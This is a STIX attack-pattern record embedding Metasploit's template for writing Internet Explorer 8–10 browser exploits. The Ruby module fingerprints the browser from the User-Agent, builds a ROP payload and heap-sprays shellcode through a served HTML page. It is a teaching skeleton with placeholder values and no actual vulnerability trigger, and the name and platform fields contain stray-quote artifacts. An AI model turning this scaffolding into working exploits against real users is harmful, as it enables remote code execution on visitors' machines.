{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84052e8b-9348-44d4-a415-8f9cc9b00cca",
    "created": "2024-08-14T16:43:31.700563Z",
    "modified": "2024-08-14T16:43:31.700567Z",
    "name": "\"Module Name\"",
    "description": "( This template covers IE8/9/10, and uses the user-agent HTTP header to detect the browser version.  Please note IE8 and newer may emulate an older IE version in compatibility mode, in that case the module won't be able to detect the browser correctly. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/example.rb",
            "external_id": "example.rb"
        },
        {
            "source_name": "reference",
            "url": "https://metasploit.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# This exploit sample demonstrates how a typical browser exploit is written using commonly\n# used components such as: HttpServer, BrowserAutopwn, RopDB, DOM Element Property Spray.\n#\n###\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n\n  # Set :classid and :method for ActiveX exploits. For example:\n  # :classid    => \"{C3B92104-B5A7-11D0-A37F-00A0248F0AF1}\",\n  # :method     => \"SetShapeNodeType\",\n  autopwn_info(\n    ua_name:    HttpClients::IE,\n    ua_minver:  \"8.0\",\n    ua_maxver:  \"10.0\",\n    javascript: true,\n    os_name:    OperatingSystems::Match::WINDOWS,\n    rank:       NormalRanking\n  )\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"Module Name\",\n        'Description'    => %q(\n          This template covers IE8/9/10, and uses the user-agent HTTP header to detect\n          the browser version.  Please note IE8 and newer may emulate an older IE version\n          in compatibility mode, in that case the module won't be able to detect the\n          browser correctly.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [ 'sinn3r' ],\n        'References'     =>\n          [\n            [ 'URL', 'https://metasploit.com' ]\n          ],\n        'Platform'       => 'win',\n        'Targets'        =>\n          [\n            [ 'Automatic', {} ],\n            [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre } ],\n            [ 'IE 8 on Windows Vista',  { 'Rop' => :jre } ],\n            [ 'IE 8 on Windows 7',      { 'Rop' => :jre } ],\n            [ 'IE 9 on Windows 7',      { 'Rop' => :jre } ],\n            [ 'IE 10 on Windows 8',     { 'Rop' => :jre } ]\n          ],\n        'Payload'        =>\n          {\n            'BadChars'        => \"\\x00\", # js_property_spray\n            'StackAdjustment' => -3500\n          },\n        'Privileged'     => false,\n        'DisclosureDate' => '2013-04-01',\n        'DefaultTarget'  => 0\n      )\n    )\n  end\n\n  def get_target(agent)\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    when '6.2'\n      os_name = 'Windows 8'\n    when '6.3'\n      os_name = 'Windows 8.1'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? && t.name.include?(ie_name)) && (!nt.empty? && t.name.include?(os_name))\n        return t\n      end\n    end\n\n    nil\n  end\n\n  def get_payload(t)\n    stack_pivot = \"\\x41\\x42\\x43\\x44\"\n    code        = payload.encoded\n\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')\n\n    else\n      print_status(\"Using JRE ROP\")\n      rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)\n    end\n\n    rop_payload\n  end\n\n  def get_html(t)\n    js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))\n    html = %|\n      <script>\n      #{js_property_spray}\n\n      var s = unescape(\"#{js_p}\");\n      sprayHeap({shellcode:s});\n      </script>\n    |\n\n    html.gsub(/^\\t\\t/, '')\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    print_status(\"Requesting: #{request.uri}\")\n\n    target = get_target(agent)\n    if target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target selected as: #{target.name}\")\n    html = get_html(target)\n    send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-01",
    "x_mitre_platforms": [
        "win'"
    ]
}